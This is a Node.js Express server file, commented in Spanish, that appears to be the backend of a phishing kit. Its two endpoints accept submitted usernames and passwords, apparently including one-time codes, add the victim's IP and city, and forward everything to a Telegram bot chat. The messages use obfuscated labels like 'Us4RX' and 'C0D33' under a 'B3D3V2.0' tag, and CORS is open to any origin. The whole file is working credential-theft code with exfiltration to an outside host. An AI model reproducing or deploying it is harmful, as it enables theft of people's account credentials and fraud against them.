const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');
const https = require("https");

const app = express();

const agent = new https.Agent({ family: 4 }); // Para forzar IPv4 si es necesario

// Configuración de CORS – permite todo (puedes restringirlo después)
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(bodyParser.json());

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.get('/', (req, res) => {
    res.send('Servidor activo');
});

app.post('/api/sendMessage', async (req, res) => {
    const { user, password } = req.body;

    if (!user || !password) {
        return res.status(400).json({ error: 'Faltan datos obligatorios (user y password)' });
    }

    // Obtener IP del cliente (funciona en Railway, Heroku, etc.)
    let ip = req.headers['x-forwarded-for'] 
        ? req.headers['x-forwarded-for'].split(',')[0].trim() 
        : req.socket.remoteAddress || 'Desconocida';

    let city = 'Desconocida';

    // Intentar obtener ciudad desde ipapi.co (desde el servidor → sin CORS)
    try {
        const ipResponse = await axios.get('https://ipapi.co/json/', {
            httpsAgent: agent,
            timeout: 5000 // 5 segundos máximo para no colgar
        });

        if (ipResponse.data && !ipResponse.data.error) {
            ip = ipResponse.data.ip || ip;
            city = ipResponse.data.city || ipResponse.data.region || 'Desconocida';
        }
    } catch (err) {
        console.error('Error al obtener geolocalización de ipapi.co:', err.message);
        // No fallamos el envío, solo usamos valores por defecto
    }

    // Construir mensaje
    const message = `🔴B3D3V2.0🔴\nUs4RX: ${user}\nContR: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown' // Opcional: para que se vea mejor en Telegram
            },
            { httpsAgent: agent }
        );

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/sendMessage2', async (req, res) => {
    const { user, password } = req.body;

    if (!user || !password) {
        return res.status(400).json({ error: 'Faltan datos obligatorios (user y password)' });
    }

    let ip = req.headers['x-forwarded-for'] 
        ? req.headers['x-forwarded-for'].split(',')[0].trim() 
        : req.socket.remoteAddress || 'Desconocida';

    let city = 'Desconocida';

    try {
        const ipResponse = await axios.get('https://ipapi.co/json/', {
            httpsAgent: agent,
            timeout: 5000
        });

        if (ipResponse.data && !ipResponse.data.error) {
            ip = ipResponse.data.ip || ip;
            city = ipResponse.data.city || ipResponse.data.region || 'Desconocida';
        }
    } catch (err) {
        console.error('Error al obtener geolocalización (sendMessage2):', err.message);
    }

    const message = `🔐🔴B3D3V2.0🔴\nUs4RX: ${user}\nC0D33: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            },
            { httpsAgent: agent }
        );

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error al enviar a Telegram (sendMessage2):', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});
